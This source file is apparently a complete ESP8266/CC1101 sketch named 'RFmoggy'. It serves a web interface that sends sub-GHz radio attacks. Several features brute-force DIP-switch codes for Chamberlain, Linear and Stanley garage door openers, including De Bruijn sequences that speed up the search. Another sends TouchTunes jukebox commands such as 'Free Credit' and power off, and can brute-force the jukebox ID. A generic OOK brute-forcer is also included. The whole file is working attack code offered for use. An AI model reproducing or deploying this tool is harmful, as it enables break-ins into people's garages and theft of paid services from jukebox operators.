#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <cc1101_debug_service.h>


ESP8266WebServer server(80);   //instantiate server at port 80 (http port)
// Replace with your network credentials
const char* ssid = "yourWifiNetwork";
const char* password = "yourWifipassword";

int gdo0;
byte bytesToSend[1036];
byte sendPacket[60];

//I was too lazy to write a de bruijn generator. Generated de bruijn sequences from https://damip.net/article-de-bruijn-sequence
String debruijn_ten = "0000000000100000000110000000101000000011100000010010000001011000000110100000011110000010001000001001100000101010000010111000001100100000110110000011101000001111100001000010001100001001010000100111000010100100001010110000101101000010111100001100010000110011000011010100001101110000111001000011101100001111010000111111000100010100010001110001001001000100101100010011010001001111000101001100010101010001010111000101100100010110110001011101000101111100011000110010100011001110001101001000110101100011011010001101111000111001100011101010001110111000111100100011110110001111101000111111100100100110010010101001001011100100110110010011101001001111100101001010011100101010110010101101001010111100101100110010110101001011011100101110110010111101001011111100110011010011001111001101010100110101110011011011001101110100110111110011100111010110011101101001110111100111101010011110111001111101100111111010011111111010101010111010101101101010111110101101011011110101110111010111101101011111110110110111011011111101110111110111101111111111000000000";
String debruijn_nine = "0000000001000000011000000101000000111000001001000001011000001101000001111000010001000010011000010101000010111000011001000011011000011101000011111000100011000100101000100111000101001000101011000101101000101111000110011000110101000110111000111001000111011000111101000111111001001001011001001101001001111001010011001010101001010111001011011001011101001011111001100111001101011001101101001101111001110101001110111001111011001111101001111111010101011010101111010110111010111011010111111011011011111011101111011111111100000000";
String debruijn_eight = "00000000100000011000001010000011100001001000010110000110100001111000100010011000101010001011100011001000110110001110100011111001001010010011100101011001011010010111100110011010100110111001110110011110100111111010101011101011011010111110110111101110111111110000000";


String jukebox_pwm_prefix = "11111111111111110000000010100010100010001000101000";  //preamble sync and vendor ID x5D converted to PWM
String jukebox_pwm_freeCredit = "10100010001000101010101000101010100010001000100010"; //x70 and inverse, converted to PWM format: 0=10 1=1000. Signal ends with EOT pulse (10)
String jukebox_pwm_pauseSong = "10101000100010101000101000100010101000100010100010"; //x32 
String jukebox_pwm_skipSong = "10001000101010001010001010101000100010100010100010";  //xCA
String jukebox_pwm_volumeUp = "10001000101000101010101010100010100010001000100010";  //xD0
String jukebox_pwm_volumeDown = "10100010100010101010100010100010100010001000100010"; //x50
String jukebox_pwm_powerOff = "10100010001000100010101010001010101010001000100010"; //x78

String main_menu = "";
String jukebox_menu = "";
String garage_menu = "";
String debruijn_menu = "";
String rfpwnon_menu = "";


void handleMainMenu() {
 Serial.println("User called the main menu");
 //String s = MAIN_page; //Read HTML contents
 server.send(200, "text/html", main_menu); //Send web page
}

void handleJukeboxMenu(){
  Serial.println("User called the jukebox menu");
  server.send(200, "text/html", jukebox_menu);
}

void handleGarageMenu(){
  Serial.println("User called the garage door menu");
  server.send(200, "text/html", garage_menu);
}

void handleDebruijnMenu(){
  Serial.println("User called the De Bruijn menu");
  server.send(200, "text/html", debruijn_menu);
}

void handleRfpwnonMenu(){
  Serial.println("User called the Rfpwnon menu");
  server.send(200, "text/html", rfpwnon_menu);
}


void handleJukeboxSend() {  
  String button = server.arg("remotebutton");
  int bruteSize = 0;
  String jukeboxID;
  
  if( server.arg("brutejuke").equals("true") ){ bruteSize = 8; jukeboxID = jukebox_pwm_prefix; }
  else{ jukeboxID = jukebox_pwm_prefix + "1010101010101010"; }

  Serial.print("TX: Jukebox "); Serial.println(button);
  
  if( server.arg("remotebutton").equals("freeCredit") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_freeCredit, false); }
  if( server.arg("remotebutton").equals("pauseSong") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_pauseSong, false); }
  if( server.arg("remotebutton").equals("skipSong") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_skipSong, false); }
  if( server.arg("remotebutton").equals("volumeUp") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_volumeUp, false); }
  if( server.arg("remotebutton").equals("volumeDown") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_volumeDown, false); }
  if( server.arg("remotebutton").equals("powerOff") ){ binaryBruteSend(bruteSize, "10", "1000", 433.92, 1.77777, 3, 50, 500, jukeboxID, false, jukebox_pwm_powerOff, false); }

  Serial.print("EOTX: Jukebox "); Serial.println(button);
 
  server.send(200, "text/html", "<h2>Signal is sent</h2><br><br><a href=\"/\">Return to Main Menu</a><br><br><a href=\"jukebox\">Return to Jukebox Menu</a>");
}


void handleGarageSend() {  
  
  if( server.arg("chamber7").equals("true") ){ 
    Serial.println("TX: Chamberlain 7dip Brute");
    binaryBruteSend(7, "0111", "0011", 390, 1.0, 8, 40, 100, "", false, "", false);
    Serial.println("EOTX: Chamberlain 7dip Brute Force");
  }
  if( server.arg("linear8").equals("true") ){
    Serial.println("TX: Linear MooreOmatic 8dip Brute");
    binaryBruteSend(8, "10000000", "11110000", 310, 2.0, 8, 40, 100,  "", false, "", false);
    Serial.println("EOTX: Linear MooreOmatic 8dip Brute");
  }
  if( server.arg("chamber8").equals("true") ){
    Serial.println("TX: Chamberlain 8dip Brute");
    binaryBruteSend(8, "0111", "0011", 390, 1.0, 8, 40, 100, "", false, "", false); 
    Serial.println("TX: Chamberlain 8dip Brute");
  }
  if( server.arg("chamber9").equals("true") ){
    Serial.println("TX: Chamberlain 9dip Brute");
    binaryBruteSend(9, "0111", "0011", 390, 1.0, 8, 40, 100,  "", false, "", false);
    Serial.println("EOTX: Chamberlain 9dip Brute");
  }
  if( server.arg("stanley10").equals("true") ){
    Serial.println("TX: Stanley MultiCode 10dip Brute");
    binaryBruteSend(10, "1000", "1110", 310, 2.0, 8, 40, 100,  "", false, "", false);
    Serial.println("EOTX: Stanley MultiCode 10dip Brute");
  } 
  if( server.arg("linear10").equals("true") ){
    Serial.println("TX: Linear MultiCode 10dip Brute");
    binaryBruteSend(10, "1000", "1110", 300, 2.0, 8, 40, 100,  "", false, "", false);
    Serial.println("EOTX: Linear MultiCode 10dip Brute");
  }

  server.send(200, "text/html", "<h2>Signal is sent</h2><br><br><a href=\"/\">Return to Main Menu</a><br><br><a href=\"garage\">Return to Garage Menu</a>");
}

void handleDebruijnSend(){
  int repeatDebru = server.arg("deBruijnRepeat").toInt();

  if( server.arg("linearDebruijn").equals("true") ){
    Serial.println("TX: Linear MultiCode10dip DeBruijn");
    binaryBruteSend(0, "1000", "1110", 300, 2.0, repeatDebru, 100, 200,  "", false, debruijn_ten, true);
    Serial.println("EOTX: Linear MultiCode10dip DeBruijn");
  }
  if( server.arg("stanleyDebruijn").equals("true") ){
    Serial.println("TX: Stanley MultiCode10dip DeBruijn");
    binaryBruteSend(0, "1000", "1110", 310, 2.0, repeatDebru, 100, 200,  "", false, debruijn_ten, true);
    Serial.println("EOTX: Stanley MultiCode10dip DeBruijn");
  }
  if( server.arg("chamberDebruijn").equals("true") ){
    Serial.println("TX: Chamberlain Binary9dip DeBruijn");
    binaryBruteSend(0, "0111", "0011", 390, 1.0, repeatDebru, 100, 200,  "", false, debruijn_nine, true);
    Serial.println("EOTX: Chamberlain Binary9dip DeBruijn");
  }
  if( server.arg("mooreDebruijn").equals("true") ){
    Serial.println("TX: Linear Moore-O-Matic8dip DeBruijn");
    binaryBruteSend(0, "10000000", "11110000", 310, 2.0, repeatDebru, 100, 200,  "", false, debruijn_eight, true);
    Serial.println("EOTX: Linear Moore-O-Matic8dip DeBruijn");
  }

  server.send(200, "text/html", "<h2>Signal is sent</h2><br><br><a href=\"/\">Return to Main Menu</a><br><br><a href=\"debruijn\">Return to DeBruijn Menu</a>");
}

void handleRfpwnonSend(){
  //add error checking & ranges/bounds!!!
  float _mhz = server.arg("pwnMHz").toFloat();
  float _baud = server.arg("pwnBaud").toFloat();
  int _dipsize = server.arg("pwnDipSize").toInt();
  int _repeatdip = server.arg("pwnRepeat").toInt();
  int _gapwidth = server.arg("pwnGapWidth").toInt();
  int _attemptwait = server.arg("pwnAttemptWait").toInt();
  String _zeropwm = server.arg("pwnZeroPwm");
  String _onepwm = server.arg("pwnOnePwm");
  String _prefixbinary = server.arg("pwnPrefix");
  String _postfixbinary = server.arg("pwnPostfix");
  bool _convertpref; bool _convertpostf;
  if( server.arg("pwnConverPrefix").equals("true") ){ _convertpref = true; }
  else{ _convertpref = false; }
  if( server.arg("pwnConvertPostfix").equals("true") ){ _convertpostf = true; }
  else{ _convertpostf = false; }

  Serial.println("TX: RfPwnOn Signal");
  //digitalWrite(LED,HIGH);
  binaryBruteSend(_dipsize, _zeropwm, _onepwm, _mhz, _baud, _repeatdip, _gapwidth, _attemptwait,
                  _prefixbinary, _convertpref, _postfixbinary, _convertpostf);

  Serial.println("EOT: RfPwnOn Signal");
  //digitalWrite(LED,LOW);

  server.send(200, "text/html", "<h2>Signal is sent</h2><br><br><a href=\"/\">Return to Main Menu</a><br><br><a href=\"rfpwnon\">Return to RfPwnOn Menu</a>");
}


//input dip switch size, PWM code for "0" and "1", frequency, datarate, repeatTimes, gap between repeats milliseconds 
void binaryBruteSend(int dipSize, String zero_pwm, String one_pwm, float freqmhz, float baud, int pulseReps, int gapWidth, 
                     int attemptPause, String prefixBinary, bool convertPrefix, String postfixBinary, bool convertPostfix){
                      
  String firstBinary;
  String pwmBinary;
  String subBinary;
  int missing;
  int i;
  int counter;
  int byteSlots;
  int sendSections;
  int leftoverSendBytes;
  int subSecStart;
  int pktLength;
  int highestDIP = pow(2, dipSize);
  

  ELECHOUSE_cc1101.setMHZ(freqmhz);
  ELECHOUSE_cc1101.set_drate(baud);
  ELECHOUSE_cc1101.setPA(12);
  //ELECHOUSE_cc1101.setIdle();
   
  for(int x = 0; x < highestDIP; x++){
    firstBinary = String(x, BIN);
    pwmBinary = "";
    subBinary = "";
      
    //pad binary with zeroes to match DIP size
    if( firstBinary.length() < dipSize ){
      missing = dipSize - firstBinary.length();
      for(int y = 0; y < missing; y++){ firstBinary = "0" + firstBinary; }
    }

    //convert pulse binary to sliced binary bits that match datarate
    if( dipSize > 0 ){ pwmBinary = convertToPWM(firstBinary, zero_pwm, one_pwm); }

    //add prefix bits and postfix bits to signal. convert to pwm if user indicates
    if( prefixBinary.length() > 0 && convertPrefix == true ){ pwmBinary = convertToPWM(prefixBinary, zero_pwm, one_pwm) + pwmBinary; }
    else{ pwmBinary = prefixBinary + pwmBinary; }
    
    if( postfixBinary.length() > 0 && convertPostfix == true ){ pwmBinary = pwmBinary + convertToPWM(postfixBinary, zero_pwm, one_pwm); }
    else{ pwmBinary = pwmBinary + postfixBinary; }



    Serial.print(x); Serial.print(" attempt: Binary string: "); Serial.println(firstBinary);
    //Serial.println("PWM binary equals:"); Serial.println(pwmBinary);
    //delay(100);

    //convert pwm binary string to byte array
    //parse String into 8 character substrings; convert substrings from String binary to int
    //pad pwm string with trailing zeroes so it can be divided into FULL bytes = string length mod 8 should equal 0
    //must pad with zeroes on right side, or else compiler pads on the left and it gives incorrect spacings
    counter = 0;
    if( pwmBinary.length() % 8 > 0 ){
      counter = 8 - (pwmBinary.length() % 8);
      for( int m = 0; m < counter; m++ ){ pwmBinary = pwmBinary + "0"; }
    }

    //Serial.print("New PWM binary string length equals: "); Serial.println( pwmBinary.length() );
    //Serial.println("New PWM binary equals:"); Serial.println(pwmBinary);
    
    byteSlots = pwmBinary.length() / 8;
    for(i = 0; i < byteSlots; i++){
      subBinary = pwmBinary.substring( (i * 8), (((i + 1) * 8) )); //substring excludes last indexed character. Very confusing
      bytesToSend[i] = convertBinStrToInt( subBinary );
      
      //Serial.print("Substring equals: "); Serial.println(subBinary);
      //Serial.print("Substring converts to integer: "); Serial.print( convertBinStrToInt(subBinary));
      //Serial.print("  Pushing byte into slot: "); Serial.println(i);
    }
    
    
    //Serial.println("Transmitting bytes");
    //Serial.print("Total bytes: "); Serial.println(i);
    //slice large byte array into 60byte sections, then transmit sections. 58 not 60, leave extra bytes for length, address, NULL, etc.???
    sendSections = i / 60;
    //Serial.print("Packets to send: "); Serial.println(sendSections);
    leftoverSendBytes = i % 60;
    for( int k = 0; k <= pulseReps; k++ ){
      if( sendSections > 0 ){ ELECHOUSE_cc1101.setPktLen(60); } //have to add extra byte to packet length? Address byte??
      subSecStart = 0;
      for( int h = 0; h < sendSections; h++){
        subSecStart = h * 60;
        for( int g = 0; g < 60; g++ ){ sendPacket[g] = bytesToSend[subSecStart++]; } 
        //Serial.print("Sending full packet: "); Serial.println(h);
        ELECHOUSE_cc1101.SendData(sendPacket, 60);
        //Serial.println("Full packet sent");
        memset(sendPacket, 0, 60);
      }
      
      //ELECHOUSE_cc1101.setIdle();
      //transmit remainder bytes
      if( leftoverSendBytes > 0 ){
        //ELECHOUSE_cc1101.setIdle();
        ELECHOUSE_cc1101.setPktLen(leftoverSendBytes); //if packet size is smaller than PKTLEN register, you will get TX FIFO underflow, requires SFTX to flush/fix
        for( int y = 0; y < leftoverSendBytes; y++ ){ sendPacket[y] = bytesToSend[subSecStart++]; }
        //Serial.println("Sending leftover packet");
        //ELECHOUSE_cc1101.setIdle();
        ELECHOUSE_cc1101.SendData(sendPacket, leftoverSendBytes);
        //Serial.println("Leftover packet sent");
    
        memset(sendPacket, 0, 60);
      }
     
      delay(gapWidth);
    }
    
    memset(bytesToSend, 0, 1036);
    i = 0;
    delay(attemptPause);
  }
}


String convertToPWM(String bulkBinary, String zeroPwm, String onePwm){
  String refinedBinary = "";
  for(int y = 0; y < bulkBinary.length(); y++){
      if( bulkBinary[y] == '0' ){ refinedBinary += zeroPwm; }
      else{ refinedBinary += onePwm; }
    }
  return refinedBinary;
}

int convertBinStrToInt(String binaryString){
  int value = 0;
  for(int z = 0; z < binaryString.length(); z++){
      value *= 2;
      if( binaryString[z] == '1' ){ value++; }
  }
  return value;
}



void setup(void){

  main_menu = "<html><body><center><h1>RFmoggy</h1>";
  main_menu += "<h2>NodeMCU ESP8266 CC1101 Sub-1GHz OOK Transmitter</h2>";
  main_menu += "<br><br><a href=\"jukebox\">Touchtunes Jukebox Remote</a><br><br>";
  main_menu += "<br><br><a href=\"garage\">Garage Door DIP Switch Hacker</a><br><br>";
  main_menu += "<br><br><a href=\"debruijn\">Garage Door DIP De Bruijn Sequence</a><br><br>";
  main_menu += "<br><br><a href=\"rfpwnon\">Rfpwnon Brute Force</a><br><br>";
  main_menu += "</center></body></html>";
 
  jukebox_menu = "<html><body><center><h1>Touchtunes Jukebox Remote Control</h1>";
  jukebox_menu += "<h3>Most jukeboxes use default Jukebox ID, no brute force needed</h3>";
  jukebox_menu += "<form action=\"sendjukebox\">";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"freeCredit\">Free Credit</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"pauseSong\">Pause Song</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"skipSong\">Skip Song</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"volumeUp\">Volume Up</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"volumeDown\">Volume Down</button></a><br><br>";
  jukebox_menu += "<button name=\"remotebutton\" type=\"submit\" value=\"powerOff\">Power Off</button></a><br><br>";
  jukebox_menu += "<input type=\"checkbox\" name=\"brutejuke\" value=\"true\">Brute Force Jukebox ID - takes appox 4min max<br><br>";
  jukebox_menu += "</form><br><a href=\"/\">Return to Main Menu</a></center></body></html>";

  garage_menu = "<html><body><center><h1>Garage Door DIP Switch Brute Force</h1><br><br>";
  garage_menu += "<form action=\"sendgarage\">";
  garage_menu += "<input type=\"checkbox\" name=\"linear10\" value=\"true\">Linear Multicode 10DIP 300MHz - 12min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"stanley10\" value=\"true\">Stanley Multicode 10DIP 310MHz - 12min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"chamber9\" value=\"true\">Chamberlain 9DIP 390Mhz - 4min max (binary, not ternary)<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"chamber8\" value=\"true\">Chamberlain 8DIP 390MHz - 3min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"linear8\" value=\"true\">Linear MooreMatic 8DIP 310MHz- 3min max<br><br>";
  garage_menu += "<input type=\"checkbox\" name=\"chamber7\" value=\"true\">Chamberlain 7DIP 390MHz - 2min max<br><br>";
  garage_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  garage_menu += "</form><br><a href=\"/\">Return to Main Menu</a></center></body></html>";

  debruijn_menu = "<html><body><center><h1>Garage Door DIP De Bruijn Sequences</h1><br><br>";
  debruijn_menu += "<form action=\"senddebruijn\">";
  debruijn_menu += "<input type=\"checkbox\" name=\"linearDebruijn\" value=\"true\">Linear Multicode 10DIP 300MHz - 1033 length sequence<br><br>";
  debruijn_menu += "<input type=\"checkbox\" name=\"stanleyDebruijn\" value=\"true\">Stanley Multicode 10DIP 310MHz - 1033 length sequence<br><br>";
  debruijn_menu += "<input type=\"checkbox\" name=\"chamberDebruijn\" value=\"true\">Chamberlain 7,8,9DIP 390Mhz - 520 length (doesn't attempt ternary bits)<br><br>";
  debruijn_menu += "<input type=\"checkbox\" name=\"mooreDebruijn\" value=\"true\">Linear MooreMatic 8DIP 310MHz- 263 length sequence<br><br>";
  debruijn_menu += "<p><label>Repeat Signal(0=send once) </label><input type=\"text\" name=\"deBruijnRepeat\" size=\"3\" value=\"0\"></p>";
  debruijn_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  debruijn_menu += "</form><br><a href=\"/\">Return to Main Menu</a></center></body></html>";
  
  rfpwnon_menu = "<html><body><center><h1>RfPwnOn OOK Brute Force Hacker</h1>";
  rfpwnon_menu += "<h3>Example will brute force jukebox poweroff signal</h3>";
  rfpwnon_menu += "<form action=\"sendrfpwnon\">";
  rfpwnon_menu += "<p><label>Freq MHz </label><input type=\"text\" name=\"pwnMHz\" size=\"10\" value=\"433.92\"></p>";
  rfpwnon_menu += "<p><label>Baud(kBPS) </label><input type=\"text\" name=\"pwnBaud\" size=\"10\" value=\"1.7777\"></p>";
  rfpwnon_menu += "<p><label>Binary(DIP) Size to Brute </label><input type=\"text\" name=\"pwnDipSize\" size=\"3\" value=\"8\"></p>";
  rfpwnon_menu += "<p><label>Repeat Signal(0=send once) </label><input type=\"text\" name=\"pwnRepeat\" size=\"3\" value=\"3\"></p>";
  rfpwnon_menu += "<p><label>Gap between repeats(ms) </label><input type=\"text\" name=\"pwnGapWidth\" size=\"5\" value=\"50\"></p>";
  rfpwnon_menu += "<p><label>Delay between next combination/attempt(ms) </label><input type=\"text\" name=\"pwnAttemptWait\" size=\"5\" value=\"500\"></p>";
  rfpwnon_menu += "<p><label>PWM Binary for 0 </label><input type=\"text\" name=\"pwnZeroPwm\" size=\"10\" value=\"10\">";
  rfpwnon_menu += "<label>PWM Binary for 1 </label><input type=\"text\" name=\"pwnOnePwm\" size=\"10\" value=\"1000\"></p>";
  rfpwnon_menu += "<p><label>Prefix bits, add to beginning of signal</label><br>";
  rfpwnon_menu += "<input type =\"text\" name=\"pwnPrefix\" size=\"60\" value=\"11111111111111110000000010100010100010001000101000\"></p>";
  rfpwnon_menu += "<input type=\"checkbox\" name=\"pwnConvertPrefix\" value=\"true\">Convert Prefix Binary to PWM bits<br>";
  rfpwnon_menu += "<p><label>Postfix bits, add to end of signal</label><br>";
  rfpwnon_menu += "<input type =\"text\" name=\"pwnPostfix\" size=\"60\" value=\"0111100010000111\"></p>";
  rfpwnon_menu += "<input type=\"checkbox\" name=\"pwnConvertPostfix\" value=\"true\" checked=\"checked\">Convert Postfix Binary to PWM bits<br>";
  rfpwnon_menu += "<p><input type=\"submit\" value=\"Submit\"></p>";
  rfpwnon_menu += "</form><br><a href=\"/\">Return to Main Menu</a></center></body></html>";
  
    
  Serial.begin(115200);
  
  WiFi.begin(ssid, password);     //Connect to your WiFi router
  Serial.println("");

  // Wait for connection
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
 
  //If connection successful show IP address in serial monitor
  Serial.println("");
  Serial.print("Connected to ");
  Serial.println(ssid);
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());  //IP address assigned to your ESP

  server.on("/", handleMainMenu);      //Which routine to handle at root location. This is display page
  server.on("/jukebox", handleJukeboxMenu);
  server.on("/garage", handleGarageMenu);
  server.on("/debruijn", handleDebruijnMenu);
  server.on("/rfpwnon", handleRfpwnonMenu);
  server.on("/sendjukebox", handleJukeboxSend);
  server.on("/sendgarage", handleGarageSend);
  server.on("/senddebruijn", handleDebruijnSend);
  server.on("/sendrfpwnon", handleRfpwnonSend);
 
  server.begin();                  //Start server
  Serial.println("HTTP server started");

  
  //Setup CC1101 Radio
  gdo0 = 5; //for esp8266 gdo0 on pin 5 = D1

  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setGDO(gdo0,0);
  //ELECHOUSE_cc1101.setCCMode(0);  //any value besides 1
  //ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.set_rxbw(100);
  ELECHOUSE_cc1101.set_drate(1.2);
  //ELECHOUSE_cc1101.setIdle();
  //ELECHOUSE_cc1101.setPA(10); 
}


void loop(void){
  server.handleClient();          //Handle client requests
  cc1101_debug.debug();
}
